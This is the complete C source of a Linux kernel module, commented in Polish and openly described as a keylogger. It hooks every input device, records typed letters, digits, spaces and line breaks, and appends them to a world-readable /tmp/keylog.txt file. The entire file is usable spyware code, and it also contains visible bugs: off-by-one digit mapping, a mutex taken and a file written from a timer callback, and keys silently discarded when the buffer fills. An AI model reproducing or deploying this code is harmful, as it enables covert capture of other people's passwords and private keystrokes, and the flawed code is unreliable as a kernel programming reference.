#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/mutex.h>
#include <linux/timer.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("281443-279460");
MODULE_DESCRIPTION("Keylogger that writes keys as characters to a text file with delayed writing");
MODULE_VERSION("1.0");

static struct input_handler keylogger_handler;
static struct file *file = NULL;
static struct mutex keylog_mutex;  // Mutex do synchronizacji zapisów
static char log_buffer[256];  // Bufor na naciśnięte klawisze
static int buffer_len = 0;
static struct timer_list keylog_timer;
static unsigned long last_key_time = 0;
#define TIMEOUT_MS 500  // Czas oczekiwania (500 ms) przed zapisaniem do pliku

// Funkcja do mapowania kodu klawisza na znak
static char keycode_to_char(unsigned int code) {
    if (code >= KEY_1 && code <= KEY_9) {
        return '0' + (code - KEY_1);  // Mapowanie cyfr 1-9 na '1'-'9'
    }
    if (code == KEY_0) {
        return '0';
    }
    if (code >= KEY_A && code <= KEY_Z) {
        return 'A' + (code - KEY_A);  // Mapowanie liter A-Z na A-Z
    }
    if (code == KEY_SPACE) {
        return ' ';  // Spacja
    }
    if (code == KEY_ENTER) {
        return '\n';  // Enter (złamanie linii)
    }
    return '\0';  // Zwróć pusty znak, jeśli klawisz nie jest obsługiwany
}

// Funkcja zapisująca naciśnięte klawisze do pliku
static void log_key_to_file(void) {
    if (buffer_len > 0) {
        mutex_lock(&keylog_mutex);
        
        // Zabezpieczamy dostęp do pliku
        if (file) {
            int len = buffer_len;
            kernel_write(file, log_buffer, len, &file->f_pos);  // Zapisujemy dane do pliku
            buffer_len = 0;  // Czyszczenie bufora po zapisie
        }
        
        mutex_unlock(&keylog_mutex);  // Zwolnienie mutexa
    }
}

// Funkcja, która uruchamia zapis do pliku po upływie czasu
static void keylog_timer_fn(struct timer_list *t) {
    log_key_to_file();  // Zapisujemy do pliku
}

// Funkcja obsługująca zdarzenie naciśnięcia klawisza
static void keylogger_event(struct input_handle *handle, unsigned int type, unsigned int code, int value) {
    if (type == EV_KEY && value == 1) {  // Zdarzenie naciśnięcia klawisza
        char key = keycode_to_char(code);  // Mapowanie kodu na znak
        if (key != '\0') {
            log_buffer[buffer_len++] = key;  // Dodajemy klawisz do bufora
            if (buffer_len >= sizeof(log_buffer) - 1) {
                buffer_len = 0;  // Zresetuj bufor, jeśli jest pełny
            }

            // Ustaw timer do zapisu
            if (time_before(jiffies, last_key_time + msecs_to_jiffies(TIMEOUT_MS))) {
                // Jeśli ostatni zapis był mniej niż TIMEOUT_MS ms temu, resetujemy timer
                mod_timer(&keylog_timer, jiffies + msecs_to_jiffies(TIMEOUT_MS));
            } else {
                // Zapisujemy do pliku natychmiastowo, jeśli minął wystarczający czas
                log_key_to_file();
            }

            last_key_time = jiffies;  // Aktualizujemy czas ostatniego naciśnięcia
        }
    }
}

// Funkcja łącząca urządzenie wejściowe
static int keylogger_connect(struct input_handler *handler, struct input_dev *dev, const struct input_device_id *id) {
    struct input_handle *handle;

    handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
    if (!handle)
        return -ENOMEM;

    handle->dev = dev;
    handle->handler = handler;
    handle->name = "keylogger";

    input_register_handle(handle);
    input_open_device(handle);

    return 0;
}

// Funkcja rozłączająca urządzenie wejściowe
static void keylogger_disconnect(struct input_handle *handle) {
    input_close_device(handle);
    input_unregister_handle(handle);
    kfree(handle);
}

// Tabela identyfikatorów urządzeń (teraz pozwalamy na dowolne urządzenia wejściowe)
static const struct input_device_id keylogger_ids[] = {
    { .driver_info = 1 },
    { },
};

MODULE_DEVICE_TABLE(input, keylogger_ids);

// Struktura handlera
static struct input_handler keylogger_handler = {
    .event = keylogger_event,
    .connect = keylogger_connect,
    .disconnect = keylogger_disconnect,
    .name = "keylogger",
    .id_table = keylogger_ids,
};

// Funkcja inicjalizacyjna
static int __init keylogger_init(void) {
    // Inicjalizujemy mutex
    mutex_init(&keylog_mutex);

    // Otwieramy plik do zapisu
    file = filp_open("/tmp/keylog.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (IS_ERR(file)) {
        printk(KERN_ERR "Failed to open /tmp/keylog.txt\n");
        return PTR_ERR(file);
    }

    // Inicjalizujemy timer
    timer_setup(&keylog_timer, keylog_timer_fn, 0);

    // Rejestrujemy handlera wejścia
    return input_register_handler(&keylogger_handler);
}

// Funkcja końcowa
static void __exit keylogger_exit(void) {
    // Zamykamy plik
    if (file)
        filp_close(file, NULL);

    // Anulujemy timer
    del_timer_sync(&keylog_timer);

    // Wyrejestrowujemy handlera wejścia
    input_unregister_handler(&keylogger_handler);

    // Zwalniamy mutex
    mutex_destroy(&keylog_mutex);
}

module_init(keylogger_init);
module_exit(keylogger_exit);
